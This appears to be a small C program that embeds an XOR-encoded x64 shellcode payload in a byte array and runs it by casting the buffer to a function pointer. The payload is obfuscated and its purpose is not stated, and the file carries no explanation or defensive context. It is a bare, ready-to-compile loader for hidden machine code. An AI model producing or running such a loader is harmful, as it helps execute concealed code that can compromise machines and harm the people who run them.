int main() {
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xeb\x4f\x01\xd0\x83\xfe\x34\x3c\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x81\x66\x59\x49\xe9\xfc"
"\x6b\x56\xea\x11\x0e\xd5\xcb\x69\x7c\x85\xe9\x4f\x10\x8c\xfc"
"\xfe\x34\x3d\xba\x07\x88\x36\xe9\xee\x6e\x56\xc1\x17\x0e\xd5"
"\xe9\xfd\x6a\x74\x14\x81\x6b\xf1\xdb\xf1\x31\x49\x1d\x25\x3a"
"\x88\x1a\xb6\x8f\x13\x89\x26\x6f\xff\xf0\x96\x34\x6f\xa3\xc6"
"\xe6\x82\xd4\xb6\xbd\xda\xe4\x4a\x01\xd0\x83\xfe\x34\x3c";

	void (*ptr)(void) = buf;
	ptr();
}
